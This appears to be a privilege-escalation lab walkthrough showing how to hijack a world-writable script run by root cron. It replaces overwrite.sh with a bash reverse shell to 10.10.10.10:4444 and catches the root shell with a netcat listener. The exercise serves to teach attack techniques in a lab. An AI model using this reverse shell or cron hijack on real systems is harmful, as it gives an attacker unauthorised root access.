Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.

View the contents of the system-wide crontab:
```
cat /etc/crontab
```
There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.

Locate the full path of the overwrite.sh file:
```
locate overwrite.sh
```
Note that the file is world-writable:
```
ls -l /usr/local/bin/overwrite.sh
```
Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener. If it doesn't recheck the permissions of the file, is anything missing?
```
nc -nvlp 4444
```
